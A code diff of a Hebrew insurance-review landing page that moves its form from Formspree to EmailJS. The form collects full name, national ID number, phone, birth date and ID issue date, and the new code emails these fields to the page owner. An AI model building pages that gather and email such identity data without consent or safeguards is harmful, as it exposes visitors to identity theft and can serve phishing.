@@ -4,15 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>בדיקת תיק ביטוח — ייעוץ והדרכות</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
-    body {
-      background-color:#0b0b0b;
-      font-family:'Heebo',sans-serif;
-      margin:0;
-      padding:0;
-      color:#fff;
-      direction:rtl;
-    }
+    body{background-color:#0b0b0b;font-family:'Heebo',sans-serif;margin:0;padding:0;color:#fff;direction:rtl;}
     .wrapper{display:flex;justify-content:center;align-items:center;flex-direction:column;min-height:100vh;text-align:center;}
     .logo img{max-width:180px;margin-bottom:20px;}
     .form-box{background-color:#111;border-radius:15px;width:90%;max-width:480px;box-shadow:0 0 25px rgba(0,0,0,0.6);overflow:hidden;animation:fadeIn 1s ease-in-out;}
@@ -31,8 +25,6 @@
     .popup.show{display:flex;opacity:1;}
     .popup-content{background:#111;padding:25px 30px;border-radius:10px;text-align:center;color:#fff;max-width:380px;animation:fadeIn 0.8s ease;}
     .popup-content h2{color:#ffd700;}
-    .popup-content a{display:inline-block;margin-top:15px;background:#25D366;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;font-weight:bold;}
-    .popup-content a:hover{background:#20b358;}
     @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
     @keyframes fadeIn{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
   </style>
@@ -46,8 +38,7 @@
       <div class="form-header">בדיקת תיק ביטוח — דקה למילוי, אלפי שקלים לחיסכון</div>
       <div class="form-subheader">בדיקה חינם וללא התחייבות - מענה מהיר</div>
 
-      <!-- ✅ שולח רק למייל שלך -->
-      <form id="contactForm" action="https://formspree.io/f/xblzbgeo" method="POST">
+      <form id="contactForm">
         <label>שם מלא</label>
         <input type="text" name="full_name" placeholder="שם פרטי ומשפחה" required>
         <label>תעודת זהות</label>
@@ -78,38 +69,40 @@
   </div>
 
   <script>
+    // אתחול EmailJS
+    (function(){
+      emailjs.init("YOUR_PUBLIC_KEY"); // ← כאן לשים את המפתח הציבורי שלך
+    })();
+
     const form=document.getElementById('contactForm');
     const popup=document.getElementById('popup');
     const loading=document.getElementById('loading');
 
-    form.addEventListener('submit',async(e)=>{
+    form.addEventListener('submit',function(e){
       e.preventDefault();
       form.style.display='none';
       loading.style.display='flex';
 
-      const data=new FormData(form);
+      const formData = {
+        full_name: form.full_name.value,
+        id_number: form.id_number.value,
+        phone: form.phone.value,
+        birth_date: form.birth_date.value,
+        id_issue_date: form.id_issue_date.value
+      };
 
-      try{
-        const response=await fetch(form.action,{
-          method:form.method,
-          body:data,
-          headers:{'Accept':'application/json'}
-        });
-
-        if(response.ok){
+      emailjs.send("service_vfjusnr","YOUR_TEMPLATE_ID",formData)
+      .then(function(){
           setTimeout(()=>{
             loading.style.display='none';
             popup.classList.add('show');
             form.reset();
           },5000);
-        }else{
-          throw new Error('שגיאה בשליחה');
-        }
-      }catch(error){
-        loading.style.display='none';
-        alert('❌ אירעה שגיאה בשליחה. נסה שוב.');
-        form.style.display='flex';
-      }
+      },function(error){
+          alert("❌ שגיאה בשליחה: " + JSON.stringify(error));
+          form.style.display='flex';
+          loading.style.display='none';
+      });
     });
 
     function closePopup(){
